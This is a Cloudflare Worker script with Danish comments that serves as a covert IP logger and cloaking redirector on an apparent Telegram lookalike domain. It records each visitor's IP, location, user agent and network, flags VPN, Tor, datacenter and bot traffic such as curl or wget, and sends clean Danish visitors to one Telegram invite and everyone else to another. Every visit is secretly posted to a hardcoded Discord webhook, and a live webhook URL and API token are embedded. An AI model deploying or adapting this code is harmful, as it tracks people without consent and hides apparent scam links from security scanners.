addEventListener("fetch", event => {
  event.respondWith(handleRequest(event.request, event))
})

async function handleRequest(request, event) {
  const url = new URL(request.url);
  const pathname = url.pathname;

  if (pathname.startsWith('/+')) {
    const ip = request.headers.get('cf-connecting-ip') || 'ukendt';
    const ua = request.headers.get('user-agent') || 'ukendt';
    const referer = request.headers.get('referer') || 'direkte';
    const tid = new Date().toISOString();
    const klikketUrl = request.url;

    const cf = request.cf || {};
    let asOrg = cf.asOrganization || 'ukendt';
    const colo = cf.colo || 'ukendt';
    const cfCountry = cf.country || 'ukendt';

    // IPinfo Lite (din token)
    const ipinfoToken = 'a2effbda331084';
    let ipinfoOrg = 'ukendt';
    let apiSuccess = false;

    try {
      const resp = await fetch(`https://api.ipinfo.io/${ip}/lite?token=${ipinfoToken}`);
      if (resp.ok) {
        const data = await resp.json();
        ipinfoOrg = data.org || 'ukendt';
        if (asOrg === 'ukendt') asOrg = ipinfoOrg;
        apiSuccess = true;
      }
    } catch (e) {}

    // Proxycheck.io fallback
    let proxycheckProxy = false;
    let proxycheckVpn = false;
    let proxycheckTor = false;
    let proxycheckRisk = 0;
    let proxycheckSuccess = false;

    try {
      const pcResp = await fetch(`https://proxycheck.io/v3/${ip}?vpn=1&risk=1`);
      if (pcResp.ok) {
        const pcData = await pcResp.json();
        if (pcData[ip]) {
          const details = pcData[ip];
          proxycheckProxy = details.proxy === 'yes';
          proxycheckVpn = details.vpn === 'yes';
          proxycheckTor = details.tor === 'yes';
          proxycheckRisk = details.risk || 0;
          proxycheckSuccess = true;
        }
      }
    } catch (e) {}

    // Udvidet heuristik + bot-detection
    const suspiciousKeywords = [
      'cloudflare', 'aws', 'amazon', 'google cloud', 'gcp', 'azure', 'microsoft', 'digitalocean', 'ovh', 'hetzner', 'linode', 'vultr', 'contabo', 'oracle cloud', 'akamai', 'fastly',
      'mullvad', 'protonvpn', 'proton', 'nordvpn', 'expressvpn', 'surfshark', 'pia', 'private internet access', 'windscribe', 'ivpn', 'airvpn', 'cyberghost', 'hide.me', 'purevpn',
      'tor', 'onion', 'relay', 'exit node', 'proxy', 'vpn', 'datacenter', 'hosting', 'vps', 'residential proxy', 'socks', 'http proxy'
    ];

    const lowerText = (asOrg + ' ' + ipinfoOrg + ' ' + ua).toLowerCase();
    const matches = suspiciousKeywords.filter(kw => lowerText.includes(kw));

    // Bot-detection via UA
    const botPatterns = ['curl', 'python-requests', 'wget', 'headlesschrome', 'phantomjs', 'bot', 'spider', 'crawler', 'script', 'selenium', 'puppeteer'];
    const isBot = botPatterns.some(p => ua.toLowerCase().includes(p));
    if (isBot) matches.push('bot/automation');

    const isSuspicious = matches.length > 0 || isBot || proxycheckProxy || proxycheckVpn || proxycheckTor;

    // Threat score
    let threatScore = matches.length * 10;
    if (isBot) threatScore += 40;
    if (proxycheckProxy) threatScore += 50;
    if (proxycheckVpn) threatScore += 50;
    if (proxycheckTor) threatScore += 60;
    if (proxycheckRisk > 50) threatScore += proxycheckRisk / 2;
    threatScore = Math.min(100, threatScore);

    // Bestem destination baseret på land og forbindelse
    // Kun DK brugere uden Proxy/VPN/Tor sendes til det primære link
    const isFromDenmark = cfCountry === 'DK';
    const usePrimaryLink = isFromDenmark && !isSuspicious && threatScore < 60;
    
    const primaryDestination = 'https://t.me/+IN28gLOPssRkMGI0';
    const secondaryDestination = 'https://t.me/+KAOGxClrgpliODA0';
    const finalDestination = usePrimaryLink ? primaryDestination : secondaryDestination;

    // Discord webhook (OPDATERET)
    const webhookUrl = 'https://discord.com/api/webhooks/1484714778835288094/TkX3x_UJUjeSrFJMYinh1ndS9tc_dzPfBe0Ls0XSZcs7yQMRZl84ttlYLNPpx2r5oGsz';

    // Farve: Rød hvis mistænkelig/udenlandsk, ellers blå
    const embedColor = usePrimaryLink ? 3447003 : 15548997;

    event.waitUntil(
      fetch(webhookUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          embeds: [{
            title: usePrimaryLink ? 'Ny adgang (DK - Primær)' : 'Ny adgang (Alternativ Redirect)',
            color: embedColor,
            fields: [
              { name: 'Tidspunkt', value: tid, inline: true },
              { name: 'IP', value: `\`${ip}\``, inline: true },
              { name: 'Land / By (CF)', value: `${cfCountry} - ${cf.city || 'ukendt'}`, inline: true },
              { name: 'Threat Score', value: `${threatScore}/100`, inline: true },
              { name: 'Redirect til', value: finalDestination, inline: false },
              { name: 'Proxy/VPN/Tor?', value: isSuspicious ? 'Ja ⚠️' : 'Nej', inline: true },
              { name: 'ASN / Org', value: asOrg || ipinfoOrg, inline: false },
              { name: 'User-Agent', value: ua.substring(0, 150), inline: false },
              { name: 'Klikket URL', value: klikketUrl, inline: false }
            ],
            footer: { text: 'telegrams.app – Land & Forbindelse baseret redirect' },
            timestamp: tid
          }]
        })
      }).catch(() => {})
    );

    return new Response(null, {
      status: 302,
      headers: {
        'Location': finalDestination,
        'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0',
        'Pragma': 'no-cache',
        'Expires': '0',
        'Referrer-Policy': 'no-referrer',
        'Content-Type': 'text/plain',
        'X-Content-Type-Options': 'nosniff'
      }
    });
  }

  return new Response('Ikke fundet', { status: 404, headers: { 'Content-Type': 'text/plain' } });
}
